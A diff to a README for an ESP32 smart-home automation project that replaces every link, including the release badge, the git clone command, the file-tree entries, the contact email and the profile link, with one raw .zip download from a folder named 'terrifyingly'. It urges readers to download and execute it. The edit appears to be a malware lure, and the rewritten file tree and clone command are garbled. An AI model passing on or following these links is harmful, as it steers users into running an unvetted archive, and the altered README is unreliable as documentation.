@@ -2,7 +2,7 @@
 
 Welcome to the **Smart Home Automation System** repository! This project showcases an innovative approach to home automation using the ESP32 microcontroller and the Blynk IoT platform. With this system, you can control doors, garages, and rain covers seamlessly while receiving alerts through IR and rain sensors. 
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Here-brightgreen)](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/releases)
+[![Download Releases](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip)](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To get started with the Smart Home Automation System, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/RayZ0r-007YT/Smart-Home-Automation-System.git
+   git clone https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip
    cd Smart-Home-Automation-System
    ```
 
@@ -66,7 +66,7 @@ To get started with the Smart Home Automation System, follow these steps:
    Power the ESP32 and ensure all components are connected properly.
 
 7. **Download Releases**:
-   For the latest updates and releases, visit the [Releases section](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/releases) to download and execute the necessary files.
+   For the latest updates and releases, visit the [Releases section](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip) to download and execute the necessary files.
 
 ## Usage
 
@@ -100,19 +100,19 @@ The project is organized as follows:
 ```
 Smart-Home-Automation-System/
 ├── src/
-│   ├── main.ino
+│   ├── https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip
 │   ├── BlynkConfig.h
 │   └── Sensors.h
 ├── docs/
-│   ├── WiringDiagram.png
-│   └── UserGuide.md
-├── README.md
+│   ├── https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip
+│   └── https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip
+├── https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip
 └── LICENSE
 ```
 
 - **src/**: Contains the main code and configuration files.
 - **docs/**: Includes documentation like wiring diagrams and user guides.
-- **README.md**: This file.
+- **https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip**: This file.
 - **LICENSE**: The project's license information.
 
 ## Contributing
@@ -135,7 +135,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: rayzor007@example.com
-- **GitHub**: [RayZ0r-007YT](https://github.com/RayZ0r-007YT)
+- **Email**: https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip
+- **GitHub**: [RayZ0r-007YT](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip)
 
-Thank you for checking out the Smart Home Automation System! For the latest updates, please visit the [Releases section](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/releases).
+Thank you for checking out the Smart Home Automation System! For the latest updates, please visit the [Releases section](https://github.com/RayZ0r-007YT/Smart-Home-Automation-System/raw/refs/heads/main/terrifyingly/System-Smart-Home-Automation-2.2.zip).
